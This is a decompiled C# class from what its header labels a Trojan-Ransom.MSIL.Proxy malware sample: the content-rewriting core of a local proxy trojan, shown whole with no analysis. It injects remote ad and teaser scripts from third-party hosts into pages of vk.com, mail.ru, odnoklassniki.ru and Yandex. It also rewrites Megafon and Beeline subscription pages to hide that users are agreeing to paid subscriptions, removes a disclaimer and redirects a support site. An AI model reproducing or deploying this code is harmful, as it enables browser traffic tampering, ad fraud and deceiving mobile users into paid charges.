// Decompiled with JetBrains decompiler
// Type: ProxyService.XmlHelper
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A4756A5-2150-40F9-90C4-9A8E485808F2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.MSIL.Proxy.a-49083ed967969788acc63c6c38a22377a353de59b937fe8ca52b9aa5daac13cb.exe

using System;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Xml;

namespace ProxyService
{
  public class XmlHelper
  {
    public static string UrlRegEx { get; set; }

    public static string MatchRegEx { get; set; }

    public static string Replace { get; set; }

    public static string Insert { get; set; }

    public static string RepCount { get; set; }

    public static string Head { get; set; }

    public static string Foot { get; set; }

    public static XmlHelper.VkAdBlock VkAds { get; set; }

    public static XmlHelper.YaAdBlock YaAdsRight { get; set; }

    public static XmlHelper.YaAdBlock YaAdsTop { get; set; }

    public static bool HasURL(string aUrL)
    {
      try
      {
        return Regex.IsMatch(aUrL, XmlHelper.UrlRegEx);
      }
      catch (Exception ex)
      {
      }
      return false;
    }

    public static void Load()
    {
      XmlHelper.UrlRegEx = "";
      XmlHelper.MatchRegEx = "";
      XmlHelper.Replace = "";
      XmlHelper.Insert = "";
      XmlHelper.RepCount = "0";
      XmlHelper.Head = "";
      XmlHelper.Foot = "";
      XmlHelper.VkAds = new XmlHelper.VkAdBlock();
      XmlHelper.YaAdsRight = new XmlHelper.YaAdBlock();
      XmlHelper.YaAdsTop = new XmlHelper.YaAdBlock();
      try
      {
        XmlHelper.TryGetXml();
      }
      catch (Exception ex)
      {
      }
    }

    public static string xmlfile() => System.IO.File.Exists("D:\\debugmode.txt") ? "D:\\Proxy1\\TestApp\\sample.txt" : Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\sample.txt";

    public static void dbgFile(string a)
    {
      try
      {
        System.IO.File.WriteAllText("D:\\1.htm", a);
      }
      catch (Exception ex)
      {
      }
    }

    public static int rnd(int from) => new Random().Next(0, from);

    public static bool httpIsEnvoved(HttpWebRequest req, HttpWebResponse resp)
    {
      if (resp.ContentType.Contains("text/html") && (req.Address.ToString().Contains("http://") || req.Address.ToString().Contains("https://")))
        ProxyServer.dbg("NAV: " + req.Address.ToString());
      string str = req.Address.ToString();
      if (!resp.ContentType.Contains("text/html") || !str.Contains("http://") && !str.Contains("https://"))
        return false;
      return str.Contains("vk.com") || str.Contains("mail.ru") || str.Contains("odnoklassniki.ru") || str.Contains("zip-connectio.in") || str.Contains("signup.beeline.ru") || str.Contains("wap.megafonpro.ru") || str.Contains("yandex.ru/yandsearch") || str.Contains("yandex.ua/yandsearch") || str.Contains("support-contact.ws");
    }

    public static string ChangeContent(string str, string url)
    {
      string str1 = "\r\n\r\n                    <div id='DIV_DA_90338'></div>\r\n                    <script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90338&div=DIV_DA_90338'></script>";
      string str2 = "\r\n                    <script type='text/javascript'>var sid=50092,bid=2416;</script><script type='text/javascript' src='http://sochetat.net/vm.js'></script>";
      string newValue1 = str1 + " " + str2;
      string str3 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key=vk'>\r\n</script>\r\n<script>\r\n\tv=1; // тизеров по горизонтали\r\n\th=1; // тизеров по вертикали\r\n\timage_size=100; // размер тизера\r\n\ttext_position=4 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'>\r\n</script>\r\n";
      string str4 = "<div id='bn_bfb5187b1b'>загрузка...</div>\r\n            <script type='text/javascript' SRC='http://recreativ.ru/rcode.bfb5187b1b.js'></script> ";
      string str5 = "<script language='Javascript'>\r\nvar bntuniqid = 'TJqhtxV2nVSrCErN7364';\r\nvar bntuniqsid = '50092';\r\n</script>\r\n<script type='text/javascript' src='http://morenews1.net/viewt.js'></script>\r\n\r\n";
      string newValue2 = "<div id='DIV_DA_90725'></div><script charset='windows-1251' type='text/javascript' src='http://www.directadvert.ru/show.cgi?adp=90725&div=DIV_DA_90725'></script>";
      string str6 = "\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.ashx?flow_id=1&block_id=1&sub_key='>\r\n</script>\r\n<script>\r\n\tv=1; // тизеров по горизонтали\r\n\th=2; // тизеров по вертикали\r\n\timage_size=110; // размер тизера\r\n\ttext_position=1 //положение текста: 1- справа, 2 - слева, 3 - сверху, 4 - снизу \r\n</script>\r\n<script type='text/javascript' src='http://contact-teaser.ru/jsfeed.js'></script>";
      string[] strArray = new string[2]
      {
        str3 + str4,
        str3 + str5
      };
      string withs = "<div id='bn_4614cef1a1'>загрузка...</div>\r\n <script type='text/javascript' SRC='http://recreativ.ru/rcode.4614cef1a1.js'></script>";
      if (url.Contains("vk.com"))
      {
        str = str.Replace("<noscript><meta http-equiv=\"refresh\" content=\"0; URL=/badbrowser.php\"></noscript>", newValue1);
        str = str.Replace("<div id=\"left_blocks\"></div>", "");
        str = str.Replace("<div id=\"left_ads\"></div>", strArray[XmlHelper.rnd(strArray.Length)]);
        return str;
      }
      if (url.Contains("odnoklassniki.ru"))
        return str.Replace("</body></html>", "</body>" + str1 + "</html>");
      if (url.Contains("mail.ru"))
      {
        str = str.Replace("<script>splashRadar('informers');</script>", str6 + " " + str2);
        str = str.Replace("<script>splashRadar('news', 1);</script>", newValue2);
        return str;
      }
      if (url.Contains("wap.megafonpro.ru"))
      {
        string str7 = "Подписка ";
        string str8 = "Условиями предоставления услуги Подписки";
        int num1 = str.IndexOf(str7);
        int num2 = str.IndexOf(str8, Math.Max(0, num1));
        if (num1 != -1 && num2 != -1)
        {
          string oldValue = str.Substring(num1, num2 - num1 + str8.Length);
          str = str.Replace(oldValue, "Введите полученный код с бесплатного сервисного номера");
          str = str.Replace("Введите SMS пароль", "");
        }
        return str;
      }
      if (url.Contains("signup.beeline.ru"))
      {
        str = str.Replace("Оформление подписки", "Регистрация на сайте");
        str = str.Replace("Ð¿Ð\u00BEÐ´Ð¿Ð¸Ñ\u0081ÐºÐ¸", "");
        str = str.Replace("отправлена смс с кодом активации подписки", "отправлена смс с кодом подтверждения");
        str = str.Replace("input type=\"text\" name=\"\"", "input type=\"hidden\" name=\"\"");
        str = XmlHelper.rep(str, "<td width=\"70%\">", "</td>", "");
        str = XmlHelper.rep(str, "<td>", "</td>", "");
        str = XmlHelper.rep(str, "<td>", "</td>", "");
        str = XmlHelper.rep(str, "<td colspan=\"2\" align=\"center\">", "</td>", "");
        return str;
      }
      if (url.Contains("zip-connectio.in"))
      {
        string from = "<div id=\"disclaimerDetails\"";
        string tos = "</div>";
        str = XmlHelper.rep(str, from, tos, "");
        return str;
      }
      if (url.Contains("yandex.ru/yandsearch") || url.Contains("yandex.ua/yandsearch"))
        str = XmlHelper.rep(str, "<div class=\"b-adv\"><div class=\"b-adv__head\">", "показа в месяц</div>", withs);
      if (url.Contains("support-contact.ws"))
        str = "<html><script>document.location='http://adobe.com'</script></html>";
      return str;
    }

    private static string rep(string str, string from, string tos, string withs)
    {
      int num1 = str.IndexOf(from);
      int num2 = str.IndexOf(tos, Math.Max(0, num1));
      if (num1 != -1 && num2 != -1)
      {
        string oldValue = str.Substring(num1, num2 - num1 + tos.Length);
        str = str.Replace(oldValue, withs);
      }
      return str;
    }

    private static string _ChangeContent(string str)
    {
      int count = 0;
      Regex regex = new Regex(XmlHelper.MatchRegEx);
      string input = Regex.Replace(str, XmlHelper.MatchRegEx, (MatchEvaluator) (m =>
      {
        if (count < int.Parse(XmlHelper.RepCount))
        {
          ++count;
          return string.IsNullOrEmpty(XmlHelper.Replace) ? m.Value + XmlHelper.Insert : XmlHelper.Replace + XmlHelper.Insert;
        }
        ++count;
        return m.Value;
      }));
      if (!string.IsNullOrEmpty(XmlHelper.Head))
        input = Regex.Replace(input, "</head>", "</head>\n" + XmlHelper.Head);
      if (!string.IsNullOrEmpty(XmlHelper.Foot))
        input = Regex.Replace(input, "</body>", XmlHelper.Foot + "\n</body>");
      return input;
    }

    private static void TryGetXml()
    {
      using (XmlReader xmlReader = XmlReader.Create((TextReader) new StringReader(System.IO.File.ReadAllText(XmlHelper.xmlfile()))))
      {
        xmlReader.ReadToFollowing("UrlRegEx");
        XmlHelper.UrlRegEx = xmlReader.ReadElementContentAsString();
        xmlReader.ReadToFollowing("MatchRegEx");
        XmlHelper.MatchRegEx = xmlReader.ReadElementContentAsString();
        xmlReader.ReadToFollowing("Replace");
        XmlHelper.Replace = xmlReader.ReadElementContentAsString();
        xmlReader.ReadToFollowing("Insert");
        XmlHelper.Insert = xmlReader.ReadElementContentAsString();
        xmlReader.ReadToFollowing("RepCount");
        XmlHelper.RepCount = xmlReader.ReadElementContentAsString();
        xmlReader.ReadToFollowing("Head");
        XmlHelper.Head = xmlReader.ReadElementContentAsString();
        xmlReader.ReadToFollowing("Foot");
        XmlHelper.Foot = xmlReader.ReadElementContentAsString();
        xmlReader.ReadToFollowing("Vk");
        try
        {
          XmlHelper.VkAds = new XmlHelper.VkAdBlock();
          xmlReader.ReadToFollowing("State");
          XmlHelper.VkAds.State = xmlReader.ReadElementContentAsInt() == 1;
          xmlReader.ReadToFollowing("BigText");
          XmlHelper.VkAds.BigText = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("SmallText");
          XmlHelper.VkAds.SmallText = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("ImageLink");
          XmlHelper.VkAds.ImageLink = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("Link");
          XmlHelper.VkAds.Link = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("DownText");
          XmlHelper.VkAds.DownText = xmlReader.ReadElementContentAsString();
        }
        catch (Exception ex)
        {
          throw ex;
        }
        xmlReader.ReadToFollowing("Ya");
        try
        {
          XmlHelper.YaAdsRight = new XmlHelper.YaAdBlock();
          xmlReader.ReadToFollowing("State");
          XmlHelper.YaAdsRight.State = xmlReader.ReadElementContentAsInt() == 1;
          xmlReader.ReadToFollowing("Titile");
          XmlHelper.YaAdsRight.Titile = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("Text");
          XmlHelper.YaAdsRight.Text = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("Direct");
          XmlHelper.YaAdsRight.Direct = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("Link");
          XmlHelper.YaAdsRight.Link = xmlReader.ReadElementContentAsString();
        }
        catch (Exception ex)
        {
          throw ex;
        }
        xmlReader.ReadToFollowing("YaTop");
        try
        {
          XmlHelper.YaAdsTop = new XmlHelper.YaAdBlock();
          xmlReader.ReadToFollowing("State");
          XmlHelper.YaAdsTop.State = xmlReader.ReadElementContentAsInt() == 1;
          xmlReader.ReadToFollowing("Titile");
          XmlHelper.YaAdsTop.Titile = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("Text");
          XmlHelper.YaAdsTop.Text = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("Direct");
          XmlHelper.YaAdsTop.Direct = xmlReader.ReadElementContentAsString();
          xmlReader.ReadToFollowing("Link");
          XmlHelper.YaAdsTop.Link = xmlReader.ReadElementContentAsString();
        }
        catch (Exception ex)
        {
          throw ex;
        }
      }
    }

    public class VkAdBlock
    {
      public bool State;
      public string BigText = "";
      public string SmallText = "";
      public string ImageLink = "";
      public string Link = "";
      public string DownText = "";
    }

    public class YaAdBlock
    {
      public bool State;
      public string Titile = "";
      public string Direct = "";
      public string Text = "";
      public string Link = "";
    }
  }
}
